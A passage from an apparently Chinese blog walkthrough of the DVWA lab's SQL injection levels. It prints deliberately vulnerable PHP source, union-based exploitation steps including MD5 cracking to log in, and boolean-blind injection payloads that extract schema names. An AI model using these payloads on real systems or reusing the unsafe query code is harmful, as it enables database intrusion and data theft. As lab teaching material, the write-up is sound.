class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;<br>        <span class="hljs-comment">// Get values</span><br>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>第一步查找注入点判断注入类型</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-38-59.png" alt="确定注入类型" class="lazyload"></p>
<p>第二步判断字段数<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-41-47.png" alt="判断字段数" class="lazyload"></p>
<p>第三步 确定字段显示顺序<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-44-09.png" alt="确定字段显示顺序" class="lazyload"></p>
<p>第四步 获取数据库名、用户名、版本号<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-48-03.png" alt="获取数据库名、用户名、版本号" class="lazyload"></p>
<p><strong>在MYSQL5.0以上版本中自带数据库 information_schema，information_schema 存储所有数据库名，表名，列名信息，可以通过查询此库获得信息</strong><br>第五步 查询库中的表<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-23-57.png" alt="查询数据库中的表" class="lazyload"><br>出现错误如何解决：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-21-53.png" alt="执行union出错" class="lazyload"><br>第六步 查询表中的字段名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-26-14.png" alt="查询字段名" class="lazyload"><br>第七步获取字段相关信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-17-27-51.png" alt="获取数据信息" class="lazyload"><br>然后md5解密直接登录就获取了权限了</p>
<p><strong>Medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-comment">//使用这个函数将mysqli_real_escape_string将x00，n，r，，’，”，x1a转义，防SQL注入</span><br>    <span class="hljs-variable">$id</span> = mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$id</span>);<br><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;<br>        <span class="hljs-comment">// Display values</span><br>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">// This is used later on in the index.php page</span><br><span class="hljs-comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><span class="hljs-variable">$number_of_rows</span> = mysqli_fetch_row( <span class="hljs-variable">$result</span> )[<span class="hljs-number">0</span>];<br><br>mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：这里使用了post方式提交，还是用了转义防止sql注入<br>第一步判断注入类型：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-14-02.png" alt="判断" class="lazyload"><br>第二部判断字段数<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-16-26.png" alt="字段数" class="lazyload"><br>第三步确定字段位置<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-21-08.png" alt="确定位置" class="lazyload"><br>第四步查询库名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-22-01.png" alt="查库名" class="lazyload"><br>第五步查表名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-25-57.png" alt="查表名" class="lazyload"><br>第六步查询users中的字段名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-40-40.png" alt="获取字段名" class="lazyload"><br>这里单引号被转义用16进制绕过<br>第七步获取字段的值<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-19-43-33.png" alt="获取内容" class="lazyload"><br>解密登录</p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span> [ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check database</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    【select * from tableName limit i,n 】</span><br><span class="hljs-comment">        tableName : 为数据表；</span><br><span class="hljs-comment">        i : 为查询结果的索引值（默认从0开始）；</span><br><span class="hljs-comment">        n : 为查询结果返回的数量</span><br><span class="hljs-comment">        查询第一条数据</span><br><span class="hljs-comment">        select * from student limit 1</span><br><span class="hljs-comment">        查询第二条数据</span><br><span class="hljs-comment">        select * from student limit 1,1</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">// Get results</span><br>    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;<br>        <span class="hljs-comment">// Get values</span><br>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        <br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>添加了limit限制可以用#注释掉后边的内容，复现过程和low一样<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-20-48-24.png" alt="复现" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Was a number entered?</span><br>    <span class="hljs-keyword">if</span>(is_numeric( <span class="hljs-variable">$id</span> )) &#123;<br>        <span class="hljs-comment">// Check the database</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::PARAM_INT );<br>        <span class="hljs-variable">$data</span>-&gt;execute();<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;fetch();<br><br>        <span class="hljs-comment">// Make sure only 1 result is returned</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) &#123;<br>            <span class="hljs-comment">// Get values</span><br>            <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;first_name&#x27;</span> ];<br>            <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_name&#x27;</span> ];<br><br>            <span class="hljs-comment">// Feedback for end user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>加入token、检测 id 是否是数字，prepare预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>
<h2 id="DVWA-–-SQL-Injection（blind）盲注"><a href="#DVWA-–-SQL-Injection（blind）盲注" class="headerlink" title="DVWA – SQL Injection（blind）盲注"></a>DVWA – SQL Injection（blind）盲注</h2><p>SQL Injection(Blind)(sql盲注)：相比于常规注入他不会返回数据的信息或语法信息，只会将服务器包装后的信息返回到页面中<br>对比：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-20-51-25.png" alt="对比图" class="lazyload"><br>盲注分类分为两类：bool盲注和时间盲注，通过返回的值或者时间来判断是否正确</p>
<p>SQL盲注的基本流程：</p>
<ol>
<li>判断是否存在注入，注入的类型</li>
<li>猜解当前数据库的名称</li>
<li>猜解数据库中的表名</li>
<li>猜解表中的字段名</li>
<li>获取表中字段的值</li>
<li>验证字段值的有效性</li>
<li>获取数据库的其他信息</li>
</ol>
<p>sql盲注主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-20-55-46.png" alt="盲注" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_DVWA</span>[<span class="hljs-string">&#x27;SQLI_DB&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-comment">// Check database</span><br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span><br><br>            <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> !== <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-variable">$exists</span> = (mysqli_num_rows( <span class="hljs-variable">$result</span> ) &gt; <span class="hljs-number">0</span>);<br>                &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SQLITE:<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$sqlite_db_connection</span>;<br><br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-variable">$results</span> = <span class="hljs-variable">$sqlite_db_connection</span>-&gt;query(<span class="hljs-variable">$query</span>);<br>                <span class="hljs-variable">$row</span> = <span class="hljs-variable">$results</span>-&gt;fetchArray();<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-variable">$row</span> !== <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">//判断exists的值大于零输出下边第一句</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$exists</span>) &#123;<br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span><br>        header( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>文本框输入并提交的形式，get方式，未作任何输入过滤和限制，攻击者可以任意构造想输入的sql查询，对没有进行任何检查、过滤、返回参数只有两种<br>第一步猜闭合方式<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-14-03.png" alt="闭合方式" class="lazyload"><br>猜测为字符型<br>第二步猜解数据库名(以数据库名的第一个字母为例)(最终可以查到数据库名root)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1&#x27; and (select ascii(substr(database(),1,1)) &gt; 111) #<br>1&#x27; and (select ascii(substr(database(),1,1)) &gt; 120) #<br>1&#x27; and (select ascii(substr(database(),1,1)) &gt; 115) #<br>1&#x27; and (select ascii(substr(database(),1,1)) &gt; 113) #<br>1&#x27; and (select ascii(substr(database(),1,1)) = 114) #<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-16-57.png" alt="猜解" class="lazyload"><br>原理通过名字的ascill码来匹配是否正确正确返回正确信息错误返回错误信息<br>第三步查表名和查库名一样依旧是利用猜解来查最终查到为guestbook(以数据库的第一个表的第一个字母为例)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) &gt; 101) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) &gt; 110) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) &gt; 105) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) &gt; 103) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) &gt; 102) #<br>1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;root&#x27; limit 0,1),1,1)) = 103) #<br><br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-20-55.png" alt="猜解表名" class="lazyload"></p>
<p>第四步猜解字段名方法一样(以数据库中第一个表第一个字段第一个字母为例)最终可以查到字段名为comment_id</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &gt; 101) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 101) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 90) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 95) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 98) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 99) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 100) #<br>1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;root&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) = 99) #<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-24-17.png" alt="猜解字段名" class="lazyload"><br>第五步猜解第一个表第一个字段的第一个数据的第一个字母最终查到数据1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 101) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 50) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 30) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 40) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 45) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 48) #<br>1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) = 49) #<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-10-27-38.png" alt="值的获取" class="lazyload"><br>剩余的数据都一样都是通过这种方式来查找</p>
<p><strong>Medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">//这里使用mysqli_real_escape_string()函数对一些符号进行了转义</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_DVWA</span>[<span class="hljs-string">&#x27;SQLI_DB&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> MYSQL:<br>            <span class="hljs-variable">$id</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$id</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>            <span class="hljs-comment">// Check database</span><br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span><br><br>            <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> !== <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-variable">$exists</span> = (mysqli_num_rows( <span class="hljs-variable">$result</span> ) &gt; <span class="hljs-number">0</span>); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors</span><br>                &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                    <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            <br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SQLITE:<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$sqlite_db_connection</span>;<br>            <br>            <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-variable">$results</span> = <span class="hljs-variable">$sqlite_db_connection</span>-&gt;query(<span class="hljs-variable">$query</span>);<br>                <span class="hljs-variable">$row</span> = <span class="hljs-variable">$results</span>-&gt;fetchArray();<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-variable">$row</span> !== <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span 